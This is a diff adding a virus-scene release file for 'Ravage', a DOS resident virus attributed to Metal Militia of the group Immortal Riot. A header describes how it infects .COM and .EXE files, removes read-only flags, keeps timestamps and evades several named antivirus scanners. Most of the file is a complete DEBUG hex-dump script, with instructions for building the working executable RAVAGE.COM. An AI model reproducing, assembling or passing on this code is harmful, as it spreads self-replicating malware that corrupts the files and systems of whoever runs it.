@@ -1,0 +1,61 @@
+  Virusname: Ravage
+  Author: Metal Militia
+  Group: Immortal Riot
+  Origin, Country: Sweden
+ 
+  Info: This is a resident infector, written by me that infects any
+        .COM or .EXE on exec/open/closing/ext. open. Just as Extasy,
+        it saves the file's time/date stamp(s), thereby only leaving
+        the traces in that it ain't stealth, so the fileincrease will
+        be seen. It will remove the read-only flag on files and infect
+        them anyhow, but will fail on write-protected floppy's due to
+        that no int24 is hooked. It's neither encrypted nor it's 
+        destructive, this might come in later versions. Please DO run
+        that lousy anti-virus SCAN when this is in memory and press Y
+        to continue when SCAN says that it's damaged!!
+
+	We'll not give out the source code to this, of the reason of
+	we'll continue on this one later on. Scan, S&S Toolkit, and
+	F-prot can't find this. TBScan says it's some "Unknown" virus,
+	because we haven't any encryption in it.
+
+
+--------------- RAVAGE DEBUG CUT HERE ------------------------------------
+N RAVAGE.COM
+E 0100  E8 18 00 CD 20 00 00 00 00 00 00 00 00 00 00 00
+E 0110  00 00 00 00 00 00 00 00 00 00 00 5D 1E 06 33 C0
+E 0120  8E D8 8E C0 BF 40 02 39 7D 25 74 19 8D 76 FD B9
+E 0130  88 01 2E F3 A4 BF C8 03 BE 84 00 56 A5 A5 5F B8
+E 0140  1C 03 AB 91 AB 07 1F 0B E4 7B 15 8C D8 05 10 00
+E 0150  01 46 16 03 46 0E 8E D0 2E 8B 66 10 2E FF 6E 14
+E 0160  BF 00 01 57 8B F5 A5 A4 C3 50 53 51 52 56 57 1E
+E 0170  06 B8 00 43 CD 21 73 03 E9 04 01 F6 C1 01 74 0D
+E 0180  80 E1 FE B8 01 43 CD 21 73 03 E9 F2 00 B8 02 3D
+E 0190  CD 21 93 0E 1F 0E 07 B8 00 57 CD 21 51 52 BE 43
+E 01A0  02 B4 3F B9 18 00 51 8B D6 CD 21 3B C1 75 2A BF
+E 01B0  CC 03 57 F3 A4 5F B8 02 42 99 CD 21 81 3D 4D 5A
+E 01C0  74 38 81 3D 5A 4D 74 32 2D 03 00 C6 05 E9 89 45
+E 01D0  01 2D 88 01 39 44 E9 75 57 59 EB 6D 3D 00 4B 74
+E 01E0  88 3D 00 3D 74 83 3D 00 3E 74 05 3D 00 6C 75 07
+E 01F0  B4 45 CD 21 E9 72 FF E9 8D 00 83 7D 10 BE 74 D9
+E 0200  50 52 05 88 01 83 D2 00 B9 00 02 F7 F1 0B D2 74
+E 0210  01 40 89 45 04 89 55 02 5A 58 B9 10 00 F7 F1 2B
+E 0220  45 08 89 55 14 89 45 16 89 45 0E C7 45 10 BE FF
+E 0230  B9 88 01 B4 40 BA 40 02 CD 21 B8 00 42 33 C9 99
+E 0240  CD 21 B4 40 8B D7 59 CD 21 5A 59 B8 01 57 CD 21
+E 0250  B4 3E CD 21 EB 29 52 41 56 41 47 45 21 20 28 63
+E 0260  29 20 4D 65 74 61 6C 20 4D 69 6C 69 74 69 61 20
+E 0270  2F 20 49 6D 6D 6F 72 74 61 6C 20 52 69 6F 74 07
+E 0280  1F 5F 5E 5A 59 5B 58 EA
+RCX
+0188
+W
+Q
+
+----------------- END OF DEBUG ------------------------------------------------
+
+   To debug this virus, save it with the F1 key, then cut out the hex-
+   dump, and write DEBUG <FILENAME - and you got a 392 long .com file
+   called RAVAGE.COM Enjoy!
+
+---------------------------------------------------------------------------
